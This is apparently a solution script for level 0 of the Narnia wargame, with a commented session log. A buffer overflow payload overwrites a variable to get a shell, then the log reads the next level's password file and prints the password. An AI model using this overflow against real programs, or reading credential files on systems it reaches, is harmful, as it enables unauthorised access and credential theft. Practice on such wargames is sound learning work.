#!/bin/sh

( python -c "print ('A'*20 + '\xDE\xAD\xBE\xEF'[::-1])"; cat; ) | ./narnia0

# narnia0@narnia:/narnia$ ( python -c "print ('A'*20 + '\xDE\xAD\xBE\xEF'[::-1])"; cat; ) | ./narnia0
# Correct val's value from 0x41414141 -> 0xdeadbeef!
# Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
# val: 0xdeadbeef
# whoami
# narnia1
# cat /etc/narnia_pass/narnia1
# efeidiedae
